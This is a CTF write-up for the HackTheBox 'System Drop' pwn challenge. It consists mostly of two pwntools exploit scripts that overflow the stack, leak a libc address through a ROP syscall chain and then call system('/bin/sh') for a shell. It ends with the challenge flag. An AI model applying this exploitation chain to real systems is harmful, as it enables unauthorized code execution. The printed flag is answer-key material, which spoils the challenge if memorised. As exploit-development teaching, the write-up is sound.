---
name: System Drop (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Pwn
description: Writeup for System Drop (Pwn) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# System Drop

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/6DRuT1JBmBE/0.jpg)](https://youtu.be/6DRuT1JBmBE?t=1685s "HTB Cyber Apocalypse CTF 2021: System Drop")

## Challenge Description

> In the dark night, we managed to sneak in the plant that manages all the resources. Ready to deploy our root-kit and stop this endless draining of our planet, we accidentally triggered the alarm! Acid started raining from the ceiling, destroying almost everything but us and small terminal-like console. We can see no output, but it still seems to work, somehow..

## Solution

#### exploit.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendline(payload)  # Pwn
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './system_drop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Swap between local and remote libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# Useful gadgets/functions
pop_rdi = 0x4005d3
pop_rsi_r15 = 0x4005d1
syscall = 0x40053b

# Leak got.alarm (libc foothold)
# https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
payload = flat({
    offset: [
        pop_rdi,
        1,  # fd (1 = stdout)
        pop_rsi_r15,
        elf.got.alarm,  # GOT function address
        0,  # Junk for R15
        syscall,
        elf.symbols.main  # Second payload
    ]
})

# Send the payload
io.sendline(payload)

# Get our leaked got.alarm address and format it
got_alarm = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_alarm: %#x", got_alarm)

# Set the libc_base_addr using the offsets
libc.address = got_alarm - libc.symbols.alarm
info("libc_base: %#x", libc.address)

# System('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.symbols.system,
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```
{% endcode %}

#### auto_rop.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendline(payload)  # Pwn
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './system_drop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Swap between local and remote libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()
rop = ROP(elf)

# Useful gadgets/functions
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  # pop rdi; ret
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]  # pop rsi; pop r15; ret
syscall = rop.find_gadget(["syscall", "ret"])[0]  # syscall; ret

# Leak got.alarm with ROP object
rop.raw([pop_rdi, 1, pop_rsi_r15, elf.got.alarm, 0, syscall])
rop.main()

# Send the payload
io.sendline(flat({offset: rop.chain()}))

# Get our leaked got.write address and format it
got_alarm = unpack(io.recv()[: 6].ljust(8, b"\x00"))
info("leaked got_alarm: %#x", got_alarm)

# Set the libc_base_addr using the offsets
libc.address = got_alarm - libc.symbols.alarm
info("libc_base: %#x", libc.address)

# /bin/sh using ROP object
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

# Send the payload
io.sendline(flat({offset: rop.chain()}))

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}`
